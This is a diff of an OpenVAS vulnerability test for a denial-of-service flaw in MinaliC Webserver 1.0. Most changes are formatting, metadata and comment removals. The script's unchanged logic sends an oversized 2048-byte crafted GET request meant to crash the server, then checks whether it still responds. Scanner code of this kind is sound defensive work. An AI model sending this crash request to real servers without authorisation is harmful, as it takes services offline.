@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_minalic_web_server_dos_vuln.nasl 5390 2017-02-21 18:39:27Z mime $
+# $Id: gb_minalic_web_server_dos_vuln.nasl 14323 2019-03-19 13:19:09Z jschulte $
 #
 # MinaliC Webserver Denial of Service Vulnerability
 #
@@ -27,15 +27,15 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.800187");
-  script_version("$Revision: 5390 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-02-21 19:39:27 +0100 (Tue, 21 Feb 2017) $");
+  script_version("$Revision: 14323 $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:19:09 +0100 (Tue, 19 Mar 2019) $");
   script_tag(name:"creation_date", value:"2010-12-09 06:36:39 +0100 (Thu, 09 Dec 2010)");
   script_bugtraq_id(44393);
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
   script_name("MinaliC Webserver Denial of Service Vulnerability");
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/41982/");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15334/");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/41982/");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15334/");
 
   script_category(ACT_DENIAL);
   script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
@@ -43,18 +43,15 @@ if(description)
   script_dependencies("gb_get_http_banner.nasl");
   script_require_ports("Services/www", 8080);
   script_mandatory_keys("minaliC/banner");
-  script_tag(name : "impact" , value : "Successful exploitation will let the remote unauthenticated
-  attackers to cause a denial of service or possibly execute arbitrary code.
-
-  Impact Level: Application");
-  script_tag(name : "affected" , value : "MinaliC Webserver MinaliC 1.0");
-  script_tag(name : "insight" , value : "The flaw is caused the way minalic webserver handles request
+  script_tag(name:"impact", value:"Successful exploitation will let the remote unauthenticated
+  attackers to cause a denial of service or possibly execute arbitrary code.");
+  script_tag(name:"affected", value:"MinaliC Webserver MinaliC 1.0");
+  script_tag(name:"insight", value:"The flaw is caused the way minalic webserver handles request
   with a length greater than or equal to 2048 bytes.");
-  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.");
-  script_tag(name : "summary" , value : "This host is running MinaliC Webserver and is prone to denial
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"summary", value:"This host is running MinaliC Webserver and is prone to denial
   of service vulnerability.");
   script_tag(name:"solution_type", value:"WillNotFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -66,16 +63,13 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Get HTTP Port
 port = get_http_port(default:8080);
 
-## Confirm the application before trying exploit
 banner = get_http_banner(port: port);
 if("Server: minaliC" >!< banner){
   exit(0);
 }
 
-## Confirm the server is alive and running
 req = http_get(item:"/", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 
@@ -88,7 +82,6 @@ craftedData = crap(data:"0x00", length:2048);
 req = http_get(item:craftedData, port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 
-## Check still server is alive or not, If not then
 ## server is died and it's vulnerable
 req = http_get(item:"/", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
